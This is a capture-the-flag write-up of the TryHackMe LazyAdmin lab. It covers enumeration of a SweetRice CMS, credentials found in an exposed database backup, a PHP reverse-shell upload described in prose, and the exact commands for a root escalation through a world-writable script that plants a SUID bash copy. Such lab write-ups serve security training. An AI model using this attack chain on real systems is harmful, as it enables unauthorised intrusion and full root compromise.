# LazyAdmin - TryHackMe — CTF Writeup

- **OS:** Linux
- **Target IP:** `10.67.159.78`

---

## Enumeration

### Nmap Scan

Starting with a service and port scan using Nmap:

```bash
nmap -sV -sC -A 10.67.159.78
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports were found:

- **22** — SSH
- **80** — HTTP web application (Apache 2.4.18)

### Directory Enumeration

The root of the web server displayed the default Apache page. A directory brute-force was performed with Gobuster:

```bash
gobuster dir --url http://10.67.159.78 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output:**

```
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.67.159.78/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
```

The `/content/` directory was promising. A second pass was run against it:

```bash
gobuster dir --url http://10.67.159.78/content/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output:**

```
/_themes              (Status: 301) [--> http://10.67.159.78/content/_themes/]
/as                   (Status: 301) [--> http://10.67.159.78/content/as/]
/attachment           (Status: 301) [--> http://10.67.159.78/content/attachment/]
/images               (Status: 301) [--> http://10.67.159.78/content/images/]
/inc                  (Status: 301) [--> http://10.67.159.78/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [--> http://10.67.159.78/content/js/]
```

### Credential Discovery

Browsing to `http://10.67.159.78/content/as` revealed a **login form** — the admin panel for **SweetRice CMS**.

The directory `http://10.67.159.78/content/inc` had directory listing enabled, exposing a MySQL backup file:

```
mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

Inspecting the SQL dump revealed a set of credentials:

| Field    | Value                                      |
|----------|--------------------------------------------|
| Username | `manager`                                  |
| Password | `42f749ade7f9e195bf475f37a44cafcb` (MD5)   |
| Plaintext| `Password123`                              |

---

## Vulnerability Research

The installed CMS version is **SweetRice 1.5.1**, which is vulnerable to **Arbitrary File Upload**, leading to **Remote Code Execution (RCE)**. This is a known, publicly documented vulnerability.

---

## Exploitation

### Gaining a Foothold — File Upload RCE

After logging into the admin panel at `/content/as` with the recovered credentials, the **Media Center** feature was used to upload a malicious PHP file containing a reverse shell payload.

Uploaded files are served from:

```
http://10.67.159.78/content/attachment/
```

A Netcat listener was started locally, the PHP reverse shell was triggered by browsing to the uploaded file, and a shell session was obtained as the `www-data` user.

### User Flag

The user flag was found at:

```bash
cat /home/itguy/user.txt
```

---

## Privilege Escalation

### Sudo Enumeration

Checking what commands the current user can run with elevated privileges:

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

The `www-data` user can run `/home/itguy/backup.pl` as root without a password.

### Analysing the Script Chain

The content of `backup.pl`:

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The script simply executes `/etc/copy.sh`. Checking the permissions of that file:

```bash
ls -la /etc/copy.sh
# -rwxrwxrwx 1 root root ... /etc/copy.sh
```

The file is **world-writable** — anyone can modify it.

### Exploiting the Writable Script

The contents of `/etc/copy.sh` were replaced with a payload that creates a SUID copy of Bash:

```bash
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /etc/copy.sh
```

The sudo command was then executed to trigger the chain:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

**Execution flow:**

1. Perl runs as root and calls `sh /etc/copy.sh`
2. `/etc/copy.sh` copies `/bin/bash` to `/tmp/rootbash`
3. `chmod +s` sets the **SUID bit** on the copy, so it executes with the owner's privileges (root)

### Root Shell

```bash
/tmp/rootbash -p
```

The `-p` flag tells Bash not to drop the elevated privileges, resulting in a root shell.

### Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Directory listing** on a web server can expose sensitive files — in this case, a database backup containing admin credentials.
- **CMS version disclosure** allows attackers to look up known vulnerabilities. Always keep CMS software up to date.
- **Writable system files** (`/etc/copy.sh`) in a sudo-accessible script chain are a critical misconfiguration. Files executed as root must never be writable by unprivileged users.
- The **SUID bash copy** technique is a classic privilege escalation method when you have the ability to write and execute files as root.

---

## Tools Summary

| Tool      | Purpose                        | Usage                                    |
|-----------|--------------------------------|------------------------------------------|
| Nmap      | Network scanner                | Port discovery and service/version detection |
| Gobuster  | Directory brute-forcer         | Web content enumeration                  |
| curl      | HTTP client                    | Manual web request testing               |
| Netcat    | Network utility                | Reverse shell listener                   |
